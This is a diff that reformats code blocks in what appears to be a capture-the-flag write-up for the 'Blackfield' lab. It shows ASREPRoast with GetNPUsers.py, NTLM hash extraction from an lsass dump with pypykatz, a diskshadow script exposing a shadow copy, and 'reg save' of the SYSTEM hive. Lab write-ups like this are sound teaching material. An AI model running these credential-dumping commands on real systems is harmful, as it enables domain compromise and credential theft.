@@ -134,7 +134,8 @@ We also notice the domain name on LDAP is <strong>Blackfield.local</strong> and 
 
 <p><em>Having this list,</em> we launch an <code class="language-plaintext highlighter-rouge">ASREPRoast</code> attack using <code class="language-plaintext highlighter-rouge">impacket</code>’s <code class="language-plaintext highlighter-rouge">GetNPUsers.py</code>.</p>
 
-<p><code class="language-plaintext highlighter-rouge">GetNPUsers.py -dc-ip 10.10.10.192 blackfield.local/ -request -usersfile users.txt</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GetNPUsers.py <span class="nt">-dc-ip</span> 10.10.10.192 blackfield.local/ <span class="nt">-request</span> <span class="nt">-usersfile</span> users.txt
+</code></pre></div></div>
 
 <p><img src="/assets/Blackfield/asrep-roast.jpg" alt="asrep-roast" /></p>
 
@@ -234,7 +235,9 @@ We also notice the domain name on LDAP is <strong>Blackfield.local</strong> and 
 
 <p>we can use a tool called <code class="language-plaintext highlighter-rouge">pypykatz</code> (https://github.com/skelsec/pypykatz) to obtain hashes from the <code class="language-plaintext highlighter-rouge">.DMP</code> files.</p>
 
-<p><code class="language-plaintext highlighter-rouge">pypykatz lsa minidump lsass.DMP</code> is the command.</p>
+<p><strong>Command:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pypykatz lsa minidump lsass.DMP
+</code></pre></div></div>
 
 <p>We do a <code class="language-plaintext highlighter-rouge">grep</code> for the <strong>NT</strong> field for the <strong>NTLM hash</strong> and use the <code class="language-plaintext highlighter-rouge">-B</code> flag to get th 3 lines before it to get the usernames.</p>
 
@@ -264,8 +267,8 @@ We also notice the domain name on LDAP is <strong>Blackfield.local</strong> and 
 
 <p>The content should be something like:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set context persistent nowriters
-add volume c: alias abuse
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">set </span>context persistent nowriters
+add volume c: <span class="nb">alias </span>abuse
 create
 expose %abuse% z:
 </code></pre></div></div>
@@ -324,7 +327,8 @@ expose %abuse% z:
 
 <p>we can then use the <code class="language-plaintext highlighter-rouge">reg</code> command with the <code class="language-plaintext highlighter-rouge">save</code> option to get the <code class="language-plaintext highlighter-rouge">SYSTEM</code> hive:</p>
 
-<p><code class="language-plaintext highlighter-rouge">reg save hklm\system c:\windows\Temp\system</code></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg save hklm\system c:\windows\Temp\system
+</code></pre></div></div>
 
 <p><img src="/assets/Blackfield/got-system-hive.jpg" alt="got-system-hive" /></p>
 
